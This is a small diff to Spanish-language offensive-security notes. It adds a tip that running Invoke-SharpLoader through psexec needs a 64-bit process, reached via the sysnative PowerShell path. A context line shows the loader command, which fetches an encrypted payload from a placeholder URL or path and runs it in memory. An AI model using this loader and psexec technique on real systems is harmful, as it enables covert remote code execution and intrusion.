@@ -16,5 +16,9 @@ Invoke-SharpLoader -location {URL o RUTA del encriptado} -password {contraseña 
 ```
 
 
+Para esto necesitamos un proceso de 64 bits, por ende cuando ejecutemos el psexec usar la ruta 
 
+
+
+C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe 
 
